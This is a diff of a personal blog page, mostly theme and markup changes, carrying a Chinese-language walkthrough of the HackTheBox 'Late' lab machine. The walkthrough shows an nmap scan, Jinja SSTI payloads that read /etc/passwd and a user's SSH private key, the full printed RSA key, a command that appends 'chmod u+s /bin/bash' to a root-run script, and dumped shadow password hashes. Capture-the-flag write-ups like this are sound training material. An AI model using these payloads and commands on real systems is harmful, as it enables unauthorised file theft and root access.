@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;463 10.10.11.156                                                                                                              端口扫描22和80: 123456789">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;463 10.10.11.156   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.156Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-26 13:58 CS">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Late - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/04/26/Late-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;463 10.10.11.156                                                                                                              端口扫描22和80: 123456789">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;463 10.10.11.156   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.156Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-26 13:58 CS">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042601.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042602.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042603.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -210,109 +217,39 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/463" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/463</a></li>
 <li>10.10.11.156</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042601.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.156</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 13:58 CST</span><br><span class="line">Nmap scan report for 10.10.11.156</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)</span><br><span class="line">|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)</span><br><span class="line">|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Late - Best online image tools</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.35 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>在线图像工具：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042602.jpg" alt=""></p>
 <h2 id="images-late-htb"><a href="#images-late-htb" class="headerlink" title="images.late.htb"></a>images.late.htb</h2><p>页面链接域名加hosts,是一个在线OCR：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.156 images.late.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042603.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042604.jpg" alt=""></p>
 <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>因为是flask做的OCR，很容易想到SSTI，测试成功 （字体坑比较大，多试几个不同的）：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042605.jpg" alt=""></p>
 <p>后面就是通过SSTI读文件，读取用户私钥：</p>
 <p>一个好的方法，直接修改网页上文字然后截图识别：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042607.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;&#x2F;etc&#x2F;passwd&quot;).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;&#x2F;home&#x2F;svc_acc&#x2F;.ssh&#x2F;id_rsa&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042606.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042608.jpg" alt=""></p>
 <h2 id="svc-acc-id-rsa"><a href="#svc-acc-id-rsa" class="headerlink" title="svc_acc_id_rsa"></a>svc_acc_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF&#x2F;P&#x2F;3Tn+fiAUHhnGvBBAyrM</span><br><span class="line">HiP3S&#x2F;DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T&#x2F;nTa3PSuR9tkiqhXTaEO</span><br><span class="line">bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi</span><br><span class="line">&#x2F;mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7</span><br><span class="line">d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS&#x2F;AnE&#x2F;B2Eelj1shYUZuPyIoLhSMicGnhB7</span><br><span class="line">7IKpZeQ+MgksRcHJ5fJ2hvTu&#x2F;T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM</span><br><span class="line">fLSmimptq&#x2F;1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0</span><br><span class="line">ppJp5a+&#x2F;OPwDJXus5lKv9MtCaBidR9&#x2F;vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz</span><br><span class="line">W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk&#x2F;c7aHYw6GQKhoN1en&#x2F;7I50IZ</span><br><span class="line">uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC</span><br><span class="line">T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH</span><br><span class="line">Ql49ezkCgYEA0OTVbOT&#x2F;EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi</span><br><span class="line">WEBJ3pvIsrUlLd9J3cY7ciRxnbanN&#x2F;Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng</span><br><span class="line">Hr4+hcK+SYNn5fCX5qjmzE6c&#x2F;5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7</span><br><span class="line">t4UB&#x2F;PaoU0+kz1dNDEyNamSe5mXh&#x2F;Hc&#x2F;mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq</span><br><span class="line">0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP&#x2F;knKxHIE</span><br><span class="line">uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y</span><br><span class="line">3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k&#x2F;1pQ</span><br><span class="line">GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F</span><br><span class="line">ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP&#x2F;INltncJPRlfkj2MpvHJfUXGhMb</span><br><span class="line">Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr</span><br><span class="line">kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+</span><br><span class="line">Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL</span><br><span class="line">K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc&#x2F;jSk0</span><br><span class="line">kxruFUgLHh7nEx&#x2F;5&#x2F;0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw&#x3D;&#x3D;</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h2 id="ssti成因分析"><a href="#ssti成因分析" class="headerlink" title="ssti成因分析"></a>ssti成因分析</h2><p>看了下代码，是直接把得到的text format到结果里然后render了：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">pytesseract.pytesseract.tesseract_cmd = <span class="string">r'/usr/bin/tesseract'</span></span><br><span class="line">scanned_text = pytesseract.image_to_string(PIL.Image.open(file_name))</span><br><span class="line">results = <span class="string">"""&lt;p&gt;&#123;&#125;&lt;/p&gt;"""</span>.format(scanned_text)</span><br><span class="line">r = render_template_string(results)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用得到的私钥登录，user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042609.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>运行linpeas，pspy之类可以发现/usr/local/sbin/ssh-alert.sh文件以root权限运行，我们可以控制这个文件，这个文件是向root发送ssh登录信息，所以可以通过ssh来触发命令执行</p>
 <h2 id="ssh-alert-sh"><a href="#ssh-alert-sh" class="headerlink" title="ssh-alert.sh"></a>ssh-alert.sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RECIPIENT=<span class="string">"root@late.htb"</span></span><br><span class="line">SUBJECT=<span class="string">"Email from Server Login: SSH Alert"</span></span><br><span class="line"></span><br><span class="line">BODY=<span class="string">"</span></span><br><span class="line"><span class="string">A SSH login was detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        User:        <span class="variable">$PAM_USER</span></span></span><br><span class="line"><span class="string">        User IP Host: <span class="variable">$PAM_RHOST</span></span></span><br><span class="line"><span class="string">        Service:     <span class="variable">$PAM_SERVICE</span></span></span><br><span class="line"><span class="string">        TTY:         <span class="variable">$PAM_TTY</span></span></span><br><span class="line"><span class="string">        Date:        `date`</span></span><br><span class="line"><span class="string">        Server:      `uname -a`</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;PAM_TYPE&#125;</span> = <span class="string">"open_session"</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Subject:<span class="variable">$&#123;SUBJECT&#125;</span> <span class="variable">$&#123;BODY&#125;</span>"</span> | /usr/sbin/sendmail <span class="variable">$&#123;RECIPIENT&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="提权-amp-amp-root-flag"><a href="#提权-amp-amp-root-flag" class="headerlink" title="提权 &amp;&amp; root flag"></a>提权 &amp;&amp; root flag</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;chmod u+s &#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;ssh-alert.sh</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042610.jpg" alt=""></p>
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl&#x2F;aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::</span><br><span class="line">svc_acc:$6$&#x2F;WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9&#x2F;MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <h2 id="cron-sh"><a href="#cron-sh" class="headerlink" title="cron.sh"></a>cron.sh</h2><p>查看root目录下scripts中文件，可以看到定时还原和情理</p>
@@ -331,7 +268,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-08-01T08:46:18.796Z" itemprop="dateUpdated">2022-08-01 16:46:18</time>
+    Last updated: <time datetime="2022-08-01T08:46:18.796Z" itemprop="dateUpdated">2022-08-01 16:46:18</time>
 </span><br>
 
 
@@ -498,11 +435,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
